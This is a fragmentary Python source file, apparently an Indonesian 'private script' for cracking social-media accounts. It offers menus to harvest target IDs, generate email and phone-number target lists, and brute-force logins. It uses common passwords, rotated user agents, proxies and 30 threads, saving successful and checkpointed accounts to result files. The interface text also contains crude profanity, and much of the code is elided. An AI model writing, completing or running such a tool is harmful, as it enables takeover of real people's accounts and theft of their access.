...
author = 'pakde qirom'
git_hub = 'github.com/pakde_qirom_nihuuu'
faceb0ok = '-'
version = 'V3.8'
...
def logo(n):
	return str(f""" (+) Private Script\n (+) Code By{M} AKU PAKDE KIROM NIH SENGGOL DONG{P}""")
def logo2():
	return str(f""" (+) Private Script\n (+) Code By{M} AKU PAKDE KIROM NIH SENGGOL DONG{P}""")
...
uas = "Mozilla/5.0 (Linux; U; Android 10; in-id; CPH2127 Build/QKQ1.200614.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/45.7.1.9"
...
try:
	clear_layar()
	print(logo2())
	print(f'\r\n [{P}+{P}] sedang dump proxy dan create useragent')
...
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" (-) wes ojo kakean protes")
	print(f" (-) teko gawe en ae genio se gk usah protes anjing")
	print("")
	print(f" (1) Crack Publik\n (2) Clone Email\n (3) Clone Nomor\n (4) Crack File\n (5){M} Keluar{P}")
	print("")
	ask = input(f' ({hh}+{P}) Pilih : ')
	print(' ')
	if ask in ['1','01']:crack_masal(t,c)
	elif ask in ['2','02']:clon_email()
	elif ask in ['3','03']:crack_nomor()
	elif ask in ['4','04']:crack_file(t,c)
	elif ask in ['5','05']:remove();exit()
...
#Clone Nomor
def crack_nomor():
	print(f' ({hh}>{P}) Crack Noomor Gunakan Sandi Manual')
	print(f' ({hh}+{P}) Masukkan Awalan Nomor. Contoh {hh}089{P}')
	depan = input(' (?) Masukan : ')
	if len(depan)==3:pass
	...
	for x in range(int(jumla)):
		...
		print('\r (!) Total Dump %s id'%(len(dump)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	atur_atur()
...
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','udin','yusuf']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f'  {b}>{P} Dump Email, Max 4000 Id')
	nama = input('  > Target : ')
	if ',' in str(nama):
		exit(f' >> Masukan 1 nama saja')
	doma = input('  > Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(' > masukan domain yang benar')
	...
	for xyz in range(int(jumlah)):
		...
		if len(dump)==4000:atur_atur()
		print('\r  > Berhasil Dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	
...
def crack_masal(t,c):
    print(f" (×) Pastikan Akun Bersifat Public")
    try:
        bz=0
    ...
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r (+) Masukan Id Ke {bz} : ')
    	try:
...
def atur_atur():
	print(" ")
	print(f'\n  {b}>{P} choose method crack ')
	ro = input(f'  1. Mobile ({kk}Very Slow{P})\n  2. Mbasic {hh}(Slow){P}\n  3. Free ({M}Fast Crackers{P})\n ({b}+{P}) Pilih : ')
	...
	print(f"{P} ")
	print(f'\n  {b}>{P} Crack With Id ?')
	ch = input(f'  1. Old To New ({kk}Very Recommended{P})\n  2. New To Old ({hh}Highly Recommended{P})\n  3. Random ({M}Not Recommended{P})\n ({b}+{P}) Pilih : ')
	if ch in ['1','01']:
		for x in dump:
			id.append(x)
	elif ch in ['2','02']:
	...
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ")
	print(f'  {hh}>{P} Dengan Menampilkan Apk Terkait Dapat Mengakibatkan Check Point ')
	apk = input(f'  {hh}>{P} Tampilan info Apli [ya/no]\n ({b}>{P}) Pilih  : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"{P} ")
	print (f'  {b}>{P} Crack Menggunakan Password ?')
	ch = input(f'  {hh}1.{P} Manual\n  {hh}2.{P} Gabungan\n  {hh}3.{P} Bawaan\n ({b}>{P}) Pilih : ')
...
def manual():
	...
	for x in B:
		pwx.append(x)
	print(f"{P} ")
	print(f' ({hh}>{P}) Results Ok Save In :{hh} {sim_ok}{P}\n ({hh}>{P}) Results Cp Save In :{M} {sim_cp}{P}')
	print(f"{P} ")
	awal = datetime.now()
...
def otomatis():
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['sayang','anjing','kontol','bismillah']
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
...
def crack(idf,pwx,url,awal):
	...
	redmi = open('bbnew.txt','r').read().splitlines()
	ua = random.choice(redmi)
	#ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15'
	proxy = {'http': 'proxy://'+random.choice(xx)}
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r  %s/%s OK:%s CP:%s  {ahir}"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
...
def key():
    ...
    try:
        ...
        print(Panel(" [×] License anda invalid",style="white"));sleep(3);exit()
def cek():
